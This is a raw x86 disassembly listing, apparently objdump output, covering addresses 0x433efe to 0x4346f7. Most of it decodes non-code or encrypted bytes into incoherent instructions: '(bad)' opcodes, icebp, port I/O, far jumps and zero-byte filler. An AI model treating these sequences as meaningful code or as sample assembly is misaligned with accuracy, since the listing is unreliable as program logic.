  433efe:	add    bh,ch
  433f00:	rcl    BYTE PTR [esi-0x75],0xf1
  433f04:	dec    edx
  433f05:	mov    edx,0x53480c0c
  433f0a:	and    DWORD PTR [ecx+ebp*8+0x56],0xffffff8b
  433f0f:	ror    DWORD PTR [ebx-0x46],0xc
  433f13:	sbb    al,0xc5
  433f15:	int3   
  433f16:	int3   
  433f17:	dec    eax
  433f18:	mov    edx,0xba48cccc
  433f1d:	int3   
  433f1e:	int3   
  433f1f:	adc    DWORD PTR [esp+ebp*8+0x53],edi
  433f23:	add    edi,DWORD PTR [ebp+esi*2+0x8]
  433f27:	mov    edi,0x1ff7dcb
  433f2c:	(bad)  
  433f2d:	push   esi
  433f2e:	lea    ebx,[edi]
  433f30:	(bad)  
  433f31:	push   ebx
  433f32:	pop    ebp
  433f33:	sahf   
  433f34:	add    al,BYTE PTR [eax]
  433f36:	push   esi
  433f37:	inc    edi
  433f38:	mov    cl,0xe0
  433f3a:	add    ah,cl
  433f3c:	add    BYTE PTR [ebp-0xa],bh
  433f3f:	xor    edi,edi
  433f41:	test   BYTE PTR [esi+0x46],al
  433f44:	dec    eax
  433f45:	push   edi
  433f46:	pop    ebx
  433f47:	cmp    esp,eax
  433f49:	add    al,0x0
  433f4b:	daa    
  433f4c:	add    DWORD PTR [eax+0x3009c00],0xffffff86
  433f53:	adc    BYTE PTR [ecx],al
  433f55:	add    BYTE PTR [eax],al
  433f57:	inc    ecx
  433f58:	adc    eax,0xc49e31
  433f5d:	add    BYTE PTR [eax],al
  433f5f:	mov    cl,0xfb
  433f61:	or     BYTE PTR [esi+0x0],0x0
  433f65:	add    BYTE PTR [eax],al
  433f67:	add    BYTE PTR [ebx+ebp*1+0x3807446],ch
  433f6e:	test   DWORD PTR [eax-0x1d],ebx
  433f71:	jl     0x433f81
  433f73:	push   edx
  433f74:	jne    0x433f75
  433f76:	add    edi,ecx
  433f78:	pusha  
  433f79:	cdq    
  433f7a:	(bad)  
  433f7b:	cmp    eax,0x8b95875
  433f80:	imul   bl
  433f82:	inc    ebp
  433f83:	or     BYTE PTR [edx],bh
  433f85:	fdiv   st(5),st
  433f87:	push   DWORD PTR [ebp-0x27]
  433f8a:	jo     0x433f93
  433f8c:	lock fwait
  433f8e:	stc    
  433f8f:	dec    edi
  433f90:	or     eax,0x750027ba
  433f95:	stos   DWORD PTR es:[edi],eax
  433f96:	imul   eax,DWORD PTR [eax],0x32
  433f99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433f9a:	inc    ebp
  433f9b:	add    BYTE PTR [ebp-0x27],dh
  433f9e:	std    
  433f9f:	clc    
  433fa0:	pusha  
  433fa1:	sbb    esi,edx
  433fa3:	cmp    eax,0x8b95875
  433fa8:	dec    ebx
  433fa9:	and    al,0x7e
  433fab:	loopne 0x434022
  433fad:	fscale 
  433faf:	push   DWORD PTR [ebp-0x27]
  433fb2:	std    
  433fb3:	pop    eax
  433fb4:	(bad)  
  433fb5:	sbb    BYTE PTR [edx+0x5b],bl
  433fb8:	mov    bh,0xe5
  433fba:	std    
  433fbb:	retf   
  433fbc:	mov    cl,0x35
  433fbe:	ror    esp,0xa9
  433fc1:	sbb    eax,0x8ec1ccc1
  433fc6:	mov    ch,ah
  433fc8:	hlt    
  433fc9:	in     eax,dx
  433fca:	add    bh,bh
  433fcc:	add    BYTE PTR [eax],al
  433fce:	add    BYTE PTR [eax],al
  433fd0:	add    BYTE PTR [edx+0x425254d9],ah
  433fd6:	jo     0x433fca
  433fd8:	mov    bh,0x7e
  433fda:	fscale 
  433fdc:	(bad)  
  433fdd:	clc    
  433fde:	jle    0x433fd0
  433fe0:	cli    
  433fe1:	add    ah,0xf3
  433fe4:	mov    ds:0x660c1eee,eax
  433fe9:	js     0x433ff5
  433feb:	adc    DWORD PTR [ebx-0x608649f],0xdcd602c7
  433ff5:	repnz test bh,al
  433ff8:	clc    
  433ff9:	dec    esp
  433ffa:	jmp    0x43407b
  433ffc:	pop    ebp
  433ffd:	lahf   
  433ffe:	add    ah,bh
  434000:	xor    al,0x3c
  434002:	jg     0x433faf
  434004:	or     dl,dh
  434006:	test   bl,al
  434008:	clc    
  434009:	sub    al,0xeb
  43400b:	scas   al,BYTE PTR es:[edi]
  43400c:	sar    BYTE PTR [esi+eax*4+0x59],0x5
  434011:	jne    0x434015
  434013:	mov    bh,0x86
  434015:	div    ch
  434017:	pop    ecx
  434018:	stc    
  434019:	or     al,0x52
  43401b:	aas    
  43401c:	cmp    eax,0x8d4aeb1a
  434021:	adc    esi,DWORD PTR [edi+0x2f]
  434024:	test   DWORD PTR [ecx],esi
  434026:	cli    
  434027:	in     eax,dx
  434028:	leave  
  434029:	cli    
  43402a:	inc    esp
  43402b:	dec    ebx
  43402c:	or     ecx,esi
  43402e:	xchg   ebx,eax
  43402f:	call   0x7cbab537
  434034:	and    BYTE PTR [eax],al
  434036:	add    BYTE PTR [eax],al
  434038:	add    BYTE PTR [eax],al
  43403a:	fsub   st(2),st
  43403c:	sbb    dl,BYTE PTR [ecx+0x27]
  43403f:	push   edx
  434040:	mov    ch,0x86
  434042:	div    ch
  434044:	or     ecx,edi
  434046:	mov    esp,0x993f2a51
  43404b:	add    bh,ah
  43404d:	add    esi,DWORD PTR [ebp-0x26]
  434050:	mov    ds:0x66027529,eax
  434055:	ror    BYTE PTR [ecx-0x6790587b],0x7f
  43405c:	scas   al,BYTE PTR es:[edi]
  43405d:	clc    
  43405e:	clc    
  43405f:	test   BYTE PTR [ebx],cl
  434061:	stc    
  434062:	mov    edx,gs
  434064:	pop    esp
  434065:	inc    esi
  434066:	adc    DWORD PTR [eax+0x74],0xbaeb8186
  43406d:	clc    
  43406e:	pop    ebp
  43406f:	push   0xec6dc400
  434074:	jge    0x43401b
  434076:	bound  eax,QWORD PTR [ebp+0x67701dc0]
  43407c:	lds    ebx,FWORD PTR [esi-0x69db79ff]
  434082:	dec    ebp
  434083:	in     al,dx
  434084:	mov    esi,DWORD PTR [ecx*2+0x4a748b39]
  43408b:	in     eax,dx
  43408c:	stc    
  43408d:	jle    0x4340ad
  43408f:	fucomp st(3)
  434091:	jbe    0x4340c0
  434093:	push   0xc2a3e5c4
  434098:	je     0x434084
  43409a:	icebp  
  43409b:	mov    edi,0x6cf9
  4340a0:	add    BYTE PTR [eax],al
  4340a2:	add    BYTE PTR [ebx-0xe],dl
  4340a5:	push   eax
  4340a6:	bound  ecx,QWORD PTR [ebx-0x2b106e2]
  4340ac:	jge    0x434039
  4340ae:	cmp    eax,0x51f9ebfc
  4340b3:	int    0xd6
  4340b5:	stc    
  4340b6:	ss icebp 
  4340b8:	mov    esi,0x6eb66404
  4340bd:	std    
  4340be:	imul   ebp,DWORD PTR [ecx+0x726485eb],0xf316f9eb
  4340c8:	cmp    eax,0x7dfbb8f0
  4340cd:	hlt    
  4340ce:	pop    es
  4340cf:	mov    ebp,0x9a29e8eb
  4340d4:	jmp    0x4340cf
  4340d6:	push   0xffffffea
  4340d8:	inc    BYTE PTR [edx+0x7ee71229]
  4340de:	mov    dl,0xa2
  4340e0:	jg     0x434065
  4340e2:	add    eax,0x64f9eb8a
  4340e7:	and    al,0xf2
  4340e9:	dec    esi
  4340ea:	pop    esp
  4340eb:	in     al,dx
  4340ec:	out    dx,al
  4340ed:	cli    
  4340ee:	add    BYTE PTR [ebx+0x4101e8f1],dh
  4340f4:	icebp  
  4340f5:	test   DWORD PTR [ebx-0x3f82fde8],0xcb7b05a8
  4340ff:	adc    edi,DWORD PTR [ebx+0x3d]
  434102:	hlt    
  434103:	mov    WORD PTR [ebp+0x7d],?
  434106:	and    al,0x0
  434108:	add    BYTE PTR [eax],al
  43410a:	add    BYTE PTR [eax],al
  43410c:	jecxz  0x4340fe
  43410e:	test   DWORD PTR [ebp-0x90d5f],0xecdad5f3
  434118:	mov    bl,0xf1
  43411a:	jnp    0x4340e0
  43411c:	sbb    BYTE PTR [edx-0x7bf08b40],al
  434122:	ret    
  434123:	jmp    DWORD PTR [edi-0x4c00db7d]
  434129:	icebp  
  43412a:	test   DWORD PTR [ebp-0x80e90],ecx
  434130:	mov    ebp,0xb2f48579
  434135:	icebp  
  434136:	imul   eax
  434138:	or     al,0xda
  43413a:	idiv   edi
  43413c:	pop    edi
  43413d:	ret    0x8504
  434140:	mov    WORD PTR [edx-0x5],?
  434143:	and    BYTE PTR [edi-0x477a7c0f],0xef
  43414a:	idiv   edi
  43414c:	push   ecx
  43414d:	push   ebx
  43414e:	clc    
  43414f:	push   edx
  434150:	and    DWORD PTR [ebx-0xc],edi
  434153:	(bad)  
  434154:	jae    0x434147
  434156:	call   0xf834c28c
  43415b:	sbb    DWORD PTR [eax+0x2],0x7d
  43415f:	shr    BYTE PTR [eax],0x4
  434162:	jnp    0x43412f
  434164:	xchg   ebx,eax
  434165:	jnp    0x4341a4
  434167:	clc    
  434168:	push   edi
  434169:	sub    DWORD PTR [edi+edi*8],0x75
  43416d:	shl    dl,1
  43416f:	jae    0x434171
  434171:	add    BYTE PTR [eax],al
  434173:	add    BYTE PTR [eax],al
  434175:	push   0x3efc4864
  43417a:	outs   dx,BYTE PTR ds:[esi]
  43417b:	sub    eax,0x70a972f9
  434180:	push   es
  434181:	lods   al,BYTE PTR ds:[esi]
  434182:	cs lock jae 0x4341fe
  434186:	bnd js 0x434179
  434189:	loope  0x434161
  43418b:	mov    dh,0x97
  43418d:	push   edx
  43418e:	mov    edx,esi
  434190:	test   eax,esi
  434192:	mov    ch,0xf2
  434194:	stc    
  434195:	inc    edx
  434196:	inc    edi
  434197:	nop
  434198:	cmp    al,BYTE PTR fs:[ecx+0x57004ef2]
  43419f:	jmp    0xe5b46c9e
  4341a4:	out    0x11,al
  4341a6:	pop    ecx
  4341a7:	bnd jge 0x4341db
  4341aa:	(bad)  
  4341ab:	add    al,0x89
  4341ae:	fdivr  QWORD PTR [esi-0x3b]
  4341b1:	or     bl,BYTE PTR [edi-0x80]
  4341b4:	ins    BYTE PTR es:[edi],dx
  4341b5:	add    bh,BYTE PTR [ecx]
  4341b7:	repnz push eax
  4341b9:	out    dx,al
  4341ba:	push   esi
  4341bb:	sbb    ecx,edi
  4341bd:	repnz sub BYTE PTR [eax-0xdd01e75],cl
  4341c4:	stc    
  4341c5:	int    0x21
  4341c7:	loope  0x4341c2
  4341c9:	ficomp DWORD PTR [ecx+edi*4+0x4]
  4341cd:	clc    
  4341ce:	sbb    DWORD PTR [ecx-0x3],ebp
  4341d1:	mul    DWORD PTR [edx+esi*8]
  4341d4:	xchg   DWORD PTR [eax],eax
  4341d6:	into   
  4341d7:	repnz stc 
  4341d9:	add    BYTE PTR [eax],al
  4341db:	add    BYTE PTR [eax],al
  4341dd:	add    BYTE PTR [edx-0x4d0071ee],bh
  4341e3:	fld    DWORD PTR [esi-0xc0fae75]
  4341e9:	stc    
  4341ea:	inc    esp
  4341eb:	inc    esi
  4341ec:	nop
  4341ed:	hlt    
  4341ee:	fwait
  4341ef:	add    ah,dl
  4341f1:	cmc    
  4341f2:	inc    ebx
  4341f3:	fcmovb st,st(7)
  4341f5:	out    0x8c,eax
  4341f7:	out    0x5e,eax
  4341f9:	repnz clc 
  4341fb:	mov    edx,0xfb6dc066
  434200:	mov    al,0x8b
  434202:	mov    dh,0xde
  434204:	xor    al,0x1
  434206:	call   0x6ccf4c6
  43420b:	push   ds
  43420c:	stos   BYTE PTR es:[edi],al
  43420d:	cmc    
  43420e:	pop    esp
  43420f:	dec    edi
  434210:	cmp    DWORD PTR [ebx+eax*8+0x75],edx
  434214:	fs lock dec edi
  434217:	out    0x92,eax
  434219:	push   esp
  43421a:	cli    
  43421b:	fs stos DWORD PTR es:[edi],eax
  43421d:	in     al,dx
  43421e:	out    0x15,eax
  434220:	out    0x3,eax
  434222:	mov    al,0xbe
  434224:	sar    DWORD PTR [esi+0x35],cl
  434227:	outs   dx,BYTE PTR ds:[esi]
  434228:	out    0x80,al
  43422a:	cmp    bh,ah
  43422c:	pop    esi
  43422d:	jg     0x434280
  43422f:	out    0x62,eax
  434231:	cmc    
  434232:	(bad)  
  434233:	xor    al,0x5b
  434235:	push   ebx
  434236:	(bad)  
  434237:	je     0x434294
  434239:	idiv   ah
  43423b:	out    0x3f,al
  43423d:	mov    ebp,0x8142e710
  434242:	add    BYTE PTR [eax],al
  434244:	add    BYTE PTR [eax],al
  434246:	add    BYTE PTR [ecx+0x61c463fd],bh
  43424c:	add    esp,DWORD PTR [esi-0x37]
  43424f:	fdivr  QWORD PTR [edx+0x64]
  434252:	and    ah,bl
  434254:	out    0x22,al
  434256:	xchg   DWORD PTR [esi],esp
  434258:	repnz mov ch,0x86
  43425b:	(bad)  
  43425c:	in     eax,dx
  43425d:	adc    ebp,esi
  43425f:	mov    esp,0xbce89fd9
  434264:	out    0x66,al
  434266:	sar    BYTE PTR [ecx+0x7d],0x27
  43426a:	jo     0x434214
  43426c:	add    DWORD PTR [eax],0x22
  43426f:	test   al,0x7a
  434271:	inc    ebx
  434272:	cmc    
  434273:	inc    esi
  434274:	jge    0x4341f9
  434276:	or     eax,0x6cf9e888
  43427b:	repz in eax,dx
  43427d:	cli    
  43427e:	(bad)  
  43427f:	mov    ecx,ebx
  434281:	daa    
  434282:	ret    0xe881
  434285:	jge    0x434234
  434287:	jb     0x43420a
  434289:	shl    BYTE PTR ds:0xb6c56774,0xed
  434290:	and    DWORD PTR [esi+ebp*4],0x348bec61
  434297:	dec    ebp
  434298:	mov    ebp,DWORD PTR ss:[edx+ebx*2-0x17]
  43429d:	stc    
  43429e:	xchg   esi,eax
  43429f:	dec    esi
  4342a0:	std    
  4342a1:	in     al,0x8e
  4342a3:	inc    ecx
  4342a4:	push   0xc2b3edc4
  4342a9:	je     0x434295
  4342ab:	add    BYTE PTR [eax],al
  4342ad:	add    BYTE PTR [eax],al
  4342af:	add    ch,dh
  4342b1:	mov    edi,0xe6b362f9
  4342b6:	mov    esp,DWORD PTR [ebx*1+0x726c8553]
  4342bd:	jmp    0x4342b8
  4342bf:	pop    esi
  4342c0:	repz jns 0x4342b7
  4342c3:	push   edi
  4342c4:	or     esp,ebp
  4342c6:	xchg   DWORD PTR [edx+edx*2-0x15],esi
  4342ca:	stc    
  4342cb:	inc    esi
  4342cc:	jmp    FWORD PTR [ecx-0x141ec1d0]
  4342d2:	call   0xfa2f0eec
  4342d7:	push   0x1a
  4342d9:	inc    DWORD PTR [edx+0x7ee76229]
  4342df:	xor    al,cl
  4342e1:	jg     0x434326
  4342e3:	adc    eax,0x6435bd85
  4342e8:	xchg   edx,eax
  4342e9:	jmp    0x4342e4
  4342eb:	add    BYTE PTR [ebx+0x54],bh
  4342ee:	or     bh,BYTE PTR [ebx]
  4342f0:	sbb    DWORD PTR [ecx],esi
  4342f2:	idiv   edi
  4342f4:	stos   DWORD PTR es:[edi],eax
  4342f5:	push   edi
  4342f6:	add    bh,BYTE PTR [ecx]
  4342f8:	or     ebp,edx
  4342fa:	ins    DWORD PTR es:[edi],dx
  4342fb:	add    eax,0x74f07355
  434300:	xchg   ecx,eax
  434301:	xchg   esp,eax
  434302:	xchg   ecx,eax
  434303:	jmp    FWORD PTR [ebx+0x708583f1]
  434309:	icebp  
  43430a:	idiv   edi
  43430c:	jmp    0xd9953f54
  434311:	xor    esp,0xfffffffe
  434314:	add    BYTE PTR [eax],al
  434316:	add    BYTE PTR [eax],al
  434318:	add    BYTE PTR [ebx],ch
  43431a:	icebp  
  43431b:	call   0xf8347a19
  434320:	and    DWORD PTR [eax],0xfffffffa
  434323:	jl     0x4342e5
  434325:	pusha  
  434326:	std    
  434327:	jp     0x4342f4
  434329:	jmp    0x43438f
  43432b:	dec    ebp
  43432c:	cld    
  43432d:	cdq    
  43432e:	cmp    edi,esp
  434330:	push   eax
  434331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434332:	jnp    0x434358
  434334:	jmp    FWORD PTR [ebx-0x5f727a0f]
  43433a:	lock idiv edi
  43433d:	xchg   ebp,eax
  43433e:	mov    esp,DWORD PTR [edi+edi*8-0x65]
  434342:	icebp  
  434343:	cmp    DWORD PTR [ebp-0x80fdc],0xffe2a5b4
  43434d:	stos   DWORD PTR es:[edi],eax
  43434e:	jge    0x434314
  434350:	add    al,0x61
  434352:	mov    esi,0xa55f0374
  434357:	test   DWORD PTR [ebx-0x7a7c2ae7],0xfff7f170
  434361:	dec    ecx
  434362:	mov    esi,DWORD PTR [edi+edi*8]
  434365:	imul   esi,ecx,0xffffff81
  434368:	lea    esi,[ebp+0x7f]
  43436b:	out    dx,al
  43436c:	stc    
  43436d:	mov    edx,0xa98b80a8
  434372:	cld    
  434373:	in     al,dx
  434374:	stc    
  434375:	cld    
  434376:	and    eax,0xeba2f974
  43437b:	aad    0x36
  43437d:	add    BYTE PTR [eax],al
  43437f:	add    BYTE PTR [eax],al
  434381:	add    BYTE PTR [edi-0x4682112d],cl
  434387:	(bad)  
  434388:	mov    al,al
  43438a:	add    eax,ebx
  43438c:	add    ch,0x82
  43438f:	pop    edi
  434390:	cwde   
  434391:	ins    BYTE PTR es:[edi],dx
  434392:	jp     0x434347
  434394:	out    dx,al
  434395:	test   DWORD PTR [eax],esi
  434397:	ss in  eax,dx
  434399:	stc    
  43439a:	push   0x71
  43439c:	mov    BYTE PTR [eax+0x62],dh
  43439f:	lods   eax,DWORD PTR ds:[esi]
  4343a0:	out    dx,al
  4343a1:	test   DWORD PTR [edi],ebp
  4343a3:	fnstcw WORD PTR [esi-0x12ee07f3]
  4343a9:	stc    
  4343aa:	dec    edx
  4343ab:	loope  0x43439a
  4343ad:	outs   dx,BYTE PTR ds:[esi]
  4343ae:	jb     0x434410
  4343b0:	dec    eax
  4343b1:	in     al,0xc2
  4343b3:	(bad)  [edx]
  4343b5:	mov    edi,0xc732d3a7
  4343ba:	outs   dx,BYTE PTR ds:[esi]
  4343bb:	mov    ds:0x56ee2071,al
  4343c0:	and    ecx,edi
  4343c2:	sbb    dl,BYTE PTR [ebp+0x7a]
  4343c5:	mov    esp,DWORD PTR [ebp+0x5c]
  4343c8:	out    dx,al
  4343c9:	stc    
  4343ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4343cb:	stos   BYTE PTR es:[edi],al
  4343cc:	out    dx,al
  4343cd:	xchg   ebx,eax
  4343ce:	ins    DWORD PTR es:[edi],dx
  4343cf:	dec    esp
  4343d0:	out    dx,al
  4343d1:	stc    
  4343d2:	neg    BYTE PTR ds:0xe85358f5
  4343d8:	mov    ebp,0x503efe55
  4343dd:	mov    ebp,0xd61a11ee
  4343e2:	out    dx,al
  4343e3:	or     ecx,DWORD PTR [edx]
  4343e5:	xchg   ebx,eax
  4343e6:	add    BYTE PTR [eax],al
  4343e8:	add    BYTE PTR [eax],al
  4343ea:	add    BYTE PTR [ebp+0x2],al
  4343ed:	and    dh,dl
  4343ef:	int3   
  4343f0:	pop    ss
  4343f1:	cmp    cl,BYTE PTR [esi]
  4343f3:	out    0x5a,al
  4343f5:	adc    dh,dl
  4343f7:	mov    esp,0x7503175a
  4343fc:	add    cl,BYTE PTR [ebp+0x5c793a04]
  434402:	das    
  434403:	pushf  
  434404:	jecxz  0x4343f8
  434406:	jnp    0x43440e
  434408:	inc    ebx
  434409:	jmp    0x8c50:0x6c798cf1
  434410:	jecxz  0x4343ec
  434412:	jnp    0x4343da
  434414:	(bad)  
  434416:	icebp  
  434417:	jl     0x434492
  434419:	sbb    al,0xd8
  43441b:	cli    
  43441c:	xor    al,0x9f
  43441e:	icebp  
  43441f:	xchg   BYTE PTR [esi+0x7775459a],ah
  434425:	pop    DWORD PTR [ebp-0x329c09cf]
  43442b:	leave  
  43442c:	or     eax,0x2753060
  434431:	out    0x7e,eax
  434433:	push   es
  434434:	out    dx,al
  434435:	xchg   ecx,eax
  434436:	icebp  
  434437:	cmp    al,0x77
  434439:	mov    ss,WORD PTR [ebp+0x20]
  43443c:	popf   
  43443d:	(bad)  
  43443e:	xor    eax,0x517ae326
  434443:	mov    edi,0xf04da677
  434448:	fmul   QWORD PTR [eax*8-0x3fcc49bf]
  43444f:	add    BYTE PTR [eax],al
  434451:	add    BYTE PTR [eax],al
  434453:	add    BYTE PTR [ecx],bh
  434455:	mov    dh,0x2b
  434457:	shl    BYTE PTR [ecx],0xb6
  43445a:	mov    esp,0x3b7f097c
  43445f:	and    BYTE PTR [edi+0x77],al
  434462:	mov    esp,0xfec299ff
  434467:	repz imul edx,DWORD PTR ds:0xfa0f9e00,0x7776e8ff
  434472:	jnp    0x4344b1
  434474:	rcr    BYTE PTR [esi+0x7acea487],0x43
  43447b:	adc    eax,0xb9083f38
  434480:	fsubrp st(2),st
  434482:	stc    
  434483:	jmp    0x1596bbfe
  434488:	shl    DWORD PTR [edi-0xb],0xf6
  43448c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43448d:	fs (bad) 
  43448f:	in     eax,0x25
  434491:	dec    eax
  434492:	test   esp,ecx
  434494:	cmp    esp,DWORD PTR [eax+ecx*1+0x83701e9]
  43449b:	cmp    cl,cl
  43449d:	loop   0x434498
  43449f:	jmp    0xd211741a
  4344a4:	rcl    edi,1
  4344a6:	stc    
  4344a7:	mov    esi,0x1704c6f9
  4344ac:	fsub   st,st(5)
  4344ae:	pop    ebx
  4344af:	stos   DWORD PTR es:[edi],eax
  4344b0:	dec    esi
  4344b1:	loop   0x434478
  4344b3:	mov    ch,0xa
  4344b5:	iret   
  4344b6:	int3   
  4344b7:	lods   eax,DWORD PTR ds:[esi]
  4344b8:	add    BYTE PTR [eax],al
  4344ba:	add    BYTE PTR [eax],al
  4344bc:	add    BYTE PTR [edx],al
  4344be:	iret   
  4344bf:	int3   
  4344c0:	cmp    al,0xb8
  4344c2:	out    dx,al
  4344c3:	push   edx
  4344c4:	bound  ebp,QWORD PTR [ebx-0x5c807cf6]
  4344ca:	or     cl,BYTE PTR [ebx+0x5b3cf327]
  4344d0:	stos   DWORD PTR es:[edi],eax
  4344d1:	jb     0x4344d5
  4344d3:	jge    0x434504
  4344d5:	push   ss
  4344d6:	add    eax,DWORD PTR [eax]
  4344d8:	jmp    0xb7459b53
  4344dd:	push   ds
  4344de:	(bad)  
  4344df:	not    BYTE PTR [esi+0x5]
  4344e2:	mov    BYTE PTR [edx+0x19],al
  4344e5:	jo     0x434533
  4344e7:	sbb    al,0x0
  4344e9:	cmp    edx,DWORD PTR [si]
  4344ec:	push   eax
  4344ed:	std    
  4344ee:	ror    dl,cl
  4344f0:	push   esi
  4344f1:	mov    dh,0x5
  4344f3:	not    DWORD PTR ds:0x3bb29c
  4344f9:	pop    edi
  4344fa:	leave  
  4344fb:	adc    BYTE PTR [ebx],dh
  4344fd:	mov    WORD PTR [ebx],?
  4344ff:	push   ebp
  434500:	ret    0x5c8
  434503:	int3   
  434504:	int3   
  434505:	nop
  434506:	mov    eax,ds:0xa160cccc
  43450b:	int3   
  43450c:	int3   
  43450d:	push   eax
  43450e:	mov    eax,ds:0x5ef9cccc
  434513:	in     al,dx
  434514:	adc    DWORD PTR [eax-0x6cccaf20],0x2f
  43451b:	jne    0x434535
  43451d:	sub    ah,bl
  43451f:	xchg   BYTE PTR [edi+0x0],al
  434522:	add    BYTE PTR [eax],al
  434524:	add    BYTE PTR [eax],al
  434526:	push   es
  434527:	push   ecx
  434528:	and    ebp,0xffffffa1
  43452b:	les    edx,FWORD PTR [eax+eax*1]
  43452e:	mov    bl,BYTE PTR [ebp+0x6d]
  434531:	or     BYTE PTR [edi-0x27],dh
  434534:	je     0x43453e
  434536:	xlat   BYTE PTR ds:[ebx]
  434537:	dec    eax
  434538:	pusha  
  434539:	or     ebx,DWORD PTR [edx-0x4df29296]
  43453f:	scas   al,BYTE PTR es:[edi]
  434540:	xchg   edx,eax
  434541:	jmp    ebx
  434543:	lock push edi
  434545:	mov    ebp,ecx
  434547:	xor    bh,BYTE PTR [edx-0x49d1e3ec]
  43454d:	loopne 0x43456b
  43454f:	add    eax,0x371a7400
  434554:	call   0xf834eb76
  434559:	lea    esi,[ecx+0xe]
  43455c:	dec    ecx
  43455d:	(bad)  
  43455e:	leave  
  43455f:	fmul   DWORD PTR [edx-0x73]
  434562:	f2xm1  
  434564:	push   eax
  434565:	call   0xfa3becdf
  43456a:	repnz imul ecx,eax,0xc
  43456e:	lock sub bh,BYTE PTR [eax+0xb]
  434572:	inc    ebx
  434573:	or     DWORD PTR [ebx+0x4917daf9],0xffffff85
  43457a:	fmul   DWORD PTR [ebp-0x638aeb41]
  434580:	push   ebp
  434581:	shl    BYTE PTR [ebp-0x15],1
  434584:	std    
  434585:	gs je  0x434528
  434588:	jmp    0x0:0x13
  43458f:	icebp  
  434590:	das    
  434591:	cmp    eax,0x7d22fe00
  434596:	les    esi,FWORD PTR [ecx-0x3c]
  434599:	retf   0x3674
  43459c:	cmp    ebp,0x3f
  43459f:	jne    0x43458c
  4345a1:	push   edi
  4345a2:	jmp    DWORD PTR [ebx]
  4345a4:	call   0x2be601c1
  4345a9:	add    al,0x85
  4345ab:	sub    BYTE PTR [edi+0x636d5376],bh
  4345b1:	ss push eax
  4345b3:	(bad)  
  4345b4:	push   ss
  4345b5:	or     al,0x87
  4345b7:	(bad)  
  4345b8:	cmc    
  4345b9:	je     0x43460e
  4345bb:	sub    DWORD PTR [ecx+eax*8+0xc],0x457cecfc
  4345c3:	lods   eax,DWORD PTR ds:[esi]
  4345c4:	push   edx
  4345c5:	pushaw 
  4345c7:	in     al,dx
  4345c8:	and    al,0x68
  4345ca:	xchg   esi,esp
  4345cc:	mov    eax,ds:0xb475fffd
  4345d1:	ret    0x8c73
  4345d4:	cld    
  4345d5:	push   eax
  4345d6:	stc    
  4345d7:	mov    BYTE PTR [ecx+0x6c753dca],ch
  4345dd:	ror    DWORD PTR [eax],0xae
  4345e0:	shrd   DWORD PTR [eax-0x119dfcf6],ebx,0x9c
  4345e8:	mov    eax,DWORD PTR [eax+edx*2-0x45]
  4345ec:	mul    dh
  4345ee:	jp     0x434626
  4345f0:	push   cs
  4345f1:	pusha  
  4345f2:	push   0x0
  4345f4:	add    BYTE PTR [eax],al
  4345f6:	add    BYTE PTR [eax],al
  4345f8:	cmp    eax,0x6d772a1b
  4345fd:	mov    ebp,DWORD PTR [ecx+0x7f]
  434600:	jne    0x434604
  434602:	out    0x7c,eax
  434604:	jge    0x434591
  434606:	pushf  
  434607:	adc    eax,DWORD PTR [eax-0x4bc86431]
  43460d:	add    ecx,esp
  43460f:	add    esi,DWORD PTR [ebp+0x2]
  434612:	pop    esi
  434613:	test   ebp,edi
  434615:	add    ah,bh
  434617:	add    ebp,DWORD PTR [eax]
  434619:	loop   0x434604
  43461b:	or     BYTE PTR [ebp+0x18097304],0xea
  434622:	in     eax,0x77
  434624:	jle    0x4345a9
  434626:	inc    DWORD PTR [eax]
  434628:	push   es
  434629:	clc    
  43462a:	test   eax,0xe7df8203
  43462f:	add    edx,DWORD PTR [eax+0x7303aa10]
  434635:	(bad)  
  434637:	add    edx,DWORD PTR [eax+0x8]
  43463a:	stos   BYTE PTR es:[edi],al
  43463b:	add    edi,DWORD PTR [edx+0x2]
  43463e:	out    0x3,eax
  434640:	lock xchg DWORD PTR [ebx+0x4],ebx
  434644:	jne    0x434648
  434646:	pusha  
  434647:	imul   eax,ebp,0xfa5c1e89
  43464d:	pop    edx
  43464e:	or     edi,DWORD PTR [ebx+0x78]
  434651:	push   esi
  434652:	pop    esi
  434653:	jle    0x434656
  434655:	add    ah,bh
  434657:	add    esi,edx
  434659:	mov    bh,BYTE PTR [edi]
  43465b:	add    al,0x0
  43465d:	add    BYTE PTR [eax],al
  43465f:	add    BYTE PTR [eax],al
  434661:	jne    0x434665
  434663:	outs   dx,BYTE PTR ds:[esi]
  434664:	inc    esi
  434665:	mov    DWORD PTR gs:[eax],eax
  434668:	push   0xffffffcd
  43466a:	add    DWORD PTR [eax],eax
  43466c:	jmp    0xa2cf0afe
  434671:	add    DWORD PTR [edx],0x4cfe900
  434677:	add    cl,ch
  434679:	jbe    0x434668
  43467b:	mov    ds:0x874aa962,eax
  434680:	jb     0x43463b
  434682:	add    DWORD PTR [eax],eax
  434684:	jmp    0xfa8f90e6
  434689:	loope  0x434611
  43468b:	test   DWORD PTR ds:0x70000271,esp
  434691:	dec    esp
  434692:	cli    
  434693:	test   BYTE PTR [ecx-0xb],dh
  434696:	add    DWORD PTR [eax],eax
  434698:	jmp    0x94501d92
  43469d:	dec    eax
  43469e:	adc    eax,0xc13c7cd1
  4346a3:	jge    0x4346d6
  4346a5:	jno    0x4346a9
  4346a7:	add    al,ch
  4346a9:	jbe    0x4346ad
  4346ab:	add    BYTE PTR [edx+0x9],ah
  4346ae:	jp     0x4346b0
  4346b0:	jmp    0x6188ce2b
  4346b5:	cld    
  4346b6:	jno    0x434654
  4346b8:	jmp    0x3aca4933
  4346bd:	in     eax,0x87
  4346bf:	mov    BYTE PTR [ecx+0x70000276],cl
  4346c5:	add    BYTE PTR [eax],al
  4346c7:	add    BYTE PTR [eax],al
  4346c9:	add    ch,bl
  4346cb:	add    BYTE PTR [eax],0xe9
  4346ce:	jbe    0x434657
  4346d0:	nop
  4346d1:	test   DWORD PTR [esi+0x2],esi
  4346d4:	add    BYTE PTR [edx-0x7d],dh
  4346d7:	fiadd  WORD PTR [edi+0x2f27a]
  4346dd:	jmp    0x61411347
  4346e2:	add    eax,DWORD PTR ds:[eax]
  4346e5:	add    BYTE PTR [ebx+esi*8],cl
  4346e8:	(bad)  
  4346e9:	fmul   QWORD PTR [edx+eax*1]
  4346ec:	add    BYTE PTR [ebx-0x28f4f023],al
  4346f2:	xchg   ebp,eax
  4346f3:	push   0x8
  4346f5:	mov    edi,eax
  4346f7:	inc    ecx
